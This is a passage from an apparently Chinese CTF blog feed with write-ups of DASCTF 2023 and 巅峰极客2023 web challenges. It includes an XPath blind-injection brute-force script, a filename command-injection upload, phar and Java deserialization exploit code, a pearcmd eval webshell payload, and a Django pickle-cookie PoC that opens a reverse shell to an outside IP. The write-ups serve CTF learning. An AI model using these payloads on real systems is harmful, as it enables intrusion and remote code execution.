class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EzFlask&quot;&gt;&lt;a href=&quot;#EzFlask&quot; class=&quot;headerlink&quot; title=&quot;EzFlask&quot;&gt;&lt;/a&gt;EzFlask&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1876/#toc_obje</summary>
      
    
    
    
    
    <category term="DASCTF 2023 &amp; 0X401-Web" scheme="https://ke1nys.github.io/tags/DASCTF-2023-0X401-Web/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2023-Web</title>
    <link href="https://ke1nys.github.io/posts/7d1902a5.html"/>
    <id>https://ke1nys.github.io/posts/7d1902a5.html</id>
    <published>2023-07-21T08:52:15.000Z</published>
    <updated>2023-07-25T06:41:43.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" 